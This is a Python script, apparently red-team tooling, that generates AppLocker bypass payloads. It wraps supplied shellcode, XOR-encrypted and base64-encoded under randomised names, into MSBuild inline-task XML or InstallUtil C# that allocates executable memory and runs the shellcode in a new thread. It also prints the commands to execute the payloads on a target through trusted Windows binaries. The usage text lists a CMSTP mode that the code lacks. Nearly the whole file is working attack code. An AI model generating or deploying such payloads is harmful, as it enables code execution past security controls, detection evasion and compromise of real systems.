#!/usr/bin/env python3
"""
AppLocker Bypass Payload Generator
Generates MSBuild XML and InstallUtil DLL payloads that execute shellcode
via trusted Windows binaries (LOLBAS).

Usage:
  gen_applocker.py --msbuild -i beacon.bin -o payload.xml
  gen_applocker.py --installutil -i beacon.bin -o payload.cs
  gen_applocker.py --cmstp -i beacon.bin -o payload.inf --lhost 10.10.14.5 --lport 8000
"""

import argparse
import base64
import os
import random
import string
import sys


def rand_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def rand_class():
    prefixes = ["System", "Config", "Service", "Runtime", "Security"]
    suffixes = ["Manager", "Handler", "Provider", "Validator", "Processor"]
    return random.choice(prefixes) + random.choice(suffixes)


def xor_encrypt(data, key):
    return bytes(b ^ key for b in data)


def gen_msbuild(shellcode_path, output_path, xor_key=None):
    """Generate MSBuild XML with inline C# task that decrypts and runs shellcode.

    Execute on target: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml
    """
    with open(shellcode_path, 'rb') as f:
        raw_sc = f.read()

    if xor_key is None:
        xor_key = random.randint(0x01, 0xfe)

    enc_sc = xor_encrypt(raw_sc, xor_key)
    b64_sc = base64.b64encode(enc_sc).decode()

    class_name = rand_class()
    v_buf = rand_name()
    v_sc = rand_name()
    v_raw = rand_name()
    v_old = rand_name()

    xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <{class_name} />
  </Target>
  <UsingTask TaskName="{class_name}"
             TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class {class_name} : Task, ITask {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, uint size, uint n, out uint old);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);

    public override bool Execute() {{
        byte[] {v_raw} = Convert.FromBase64String("{b64_sc}");
        byte[] {v_sc} = new byte[{v_raw}.Length];
        for (int i = 0; i < {v_raw}.Length; i++) {{
            {v_sc}[i] = (byte)({v_raw}[i] ^ {hex(xor_key)});
        }}
        IntPtr {v_buf} = VirtualAlloc(IntPtr.Zero, (uint){v_sc}.Length, 0x3000, 0x04);
        Marshal.Copy({v_sc}, 0, {v_buf}, {v_sc}.Length);
        uint {v_old};
        VirtualProtect({v_buf}, (uint){v_sc}.Length, 0x20, out {v_old});
        IntPtr t = CreateThread(IntPtr.Zero, 0, {v_buf}, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
        return true;
    }}
}}
      ]]></Code>
    </Task>
  </UsingTask>
</Project>"""

    with open(output_path, 'w') as f:
        f.write(xml)

    print(f"[+] MSBuild payload: {output_path} ({len(raw_sc)} bytes shellcode, XOR 0x{xor_key:02x})")
    print(f"[*] Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {os.path.basename(output_path)}")
    return True


def gen_installutil(shellcode_path, output_path, xor_key=None):
    """Generate C# source for InstallUtil bypass.

    Compile on target: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library /out:payload.dll payload.cs
    Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
    """
    with open(shellcode_path, 'rb') as f:
        raw_sc = f.read()

    if xor_key is None:
        xor_key = random.randint(0x01, 0xfe)

    enc_sc = xor_encrypt(raw_sc, xor_key)
    b64_sc = base64.b64encode(enc_sc).decode()

    class_name = rand_class()
    v_buf = rand_name()
    v_sc = rand_name()
    v_raw = rand_name()
    v_old = rand_name()

    cs = f"""using System;
using System.Configuration.Install;
using System.ComponentModel;
using System.Runtime.InteropServices;

[RunInstaller(true)]
public class {class_name} : Installer {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, uint size, uint n, out uint old);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);

    public override void Uninstall(System.Collections.IDictionary state) {{
        byte[] {v_raw} = Convert.FromBase64String("{b64_sc}");
        byte[] {v_sc} = new byte[{v_raw}.Length];
        for (int i = 0; i < {v_raw}.Length; i++) {{
            {v_sc}[i] = (byte)({v_raw}[i] ^ {hex(xor_key)});
        }}
        IntPtr {v_buf} = VirtualAlloc(IntPtr.Zero, (uint){v_sc}.Length, 0x3000, 0x04);
        Marshal.Copy({v_sc}, 0, {v_buf}, {v_sc}.Length);
        uint {v_old};
        VirtualProtect({v_buf}, (uint){v_sc}.Length, 0x20, out {v_old});
        IntPtr t = CreateThread(IntPtr.Zero, 0, {v_buf}, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }}
}}
"""

    with open(output_path, 'w') as f:
        f.write(cs)

    print(f"[+] InstallUtil payload: {output_path} ({len(raw_sc)} bytes shellcode, XOR 0x{xor_key:02x})")
    print(f"[*] Compile: csc.exe /target:library /out:p.dll {os.path.basename(output_path)}")
    print(f"[*] Execute: InstallUtil.exe /logfile= /LogToConsole=false /U p.dll")
    return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AppLocker Bypass Payload Generator')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--msbuild', action='store_true',
                       help='Generate MSBuild XML payload')
    group.add_argument('--installutil', action='store_true',
                       help='Generate InstallUtil C# payload')
    parser.add_argument('-i', '--input', required=True,
                        help='Input shellcode file (.bin)')
    parser.add_argument('-o', '--output', required=True,
                        help='Output file path')
    parser.add_argument('--xor-key', type=lambda x: int(x, 0), default=None,
                        help='XOR key (default: random)')
    args = parser.parse_args()

    if args.msbuild:
        if not gen_msbuild(args.input, args.output, args.xor_key):
            sys.exit(1)
    elif args.installutil:
        if not gen_installutil(args.input, args.output, args.xor_key):
            sys.exit(1)
